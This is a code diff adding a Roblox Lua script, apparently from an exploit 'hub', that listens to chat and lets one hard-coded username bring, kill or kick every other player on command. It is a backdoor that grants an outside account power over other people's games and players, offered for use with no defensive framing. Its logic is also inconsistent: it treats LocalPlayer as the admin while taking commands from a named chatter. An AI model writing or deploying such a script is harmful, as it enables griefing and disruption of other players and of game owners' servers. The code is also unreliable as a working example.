@@ -1,0 +1,66 @@
+local Players = game:GetService("Players")
+
+local function bringAll()
+    local admin = Players.LocalPlayer
+    if not admin or not admin.Character then return end
+    local adminHRP = admin.Character:FindFirstChild("HumanoidRootPart")
+    if not adminHRP then return end
+    
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= admin and player.Character then
+            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                hrp.CFrame = adminHRP.CFrame + Vector3.new(0, 3, 0)
+            end
+        end
+    end
+end
+
+local function killAll()
+    local admin = Players.LocalPlayer
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= admin and player.Character then
+            local humanoid = player.Character:FindFirstChild("Humanoid")
+            if humanoid then
+                humanoid.Health = 0
+            end
+        end
+    end
+end
+
+local function kickAll()
+    local admin = Players.LocalPlayer
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= admin then
+            player:Kick("Kicked by Brandon Hub Admin")
+        end
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        if player.Name == "MaybeFlashh" then
+            if message == ":bring all" then
+                bringAll()
+            elseif message == ":kill all" then
+                killAll()
+            elseif message == ":kick all" then
+                kickAll()
+            end
+        end
+    end)
+end
+
+Players.PlayerAdded:Connect(function(newPlayer)
+    newPlayer.Chatted:Connect(function(message)
+        if newPlayer.Name == "MaybeFlashh" then
+            if message == ":bring all" then
+                bringAll()
+            elseif message == ":kill all" then
+                killAll()
+            elseif message == ":kick all" then
+                kickAll()
+            end
+        end
+    end)
+end)
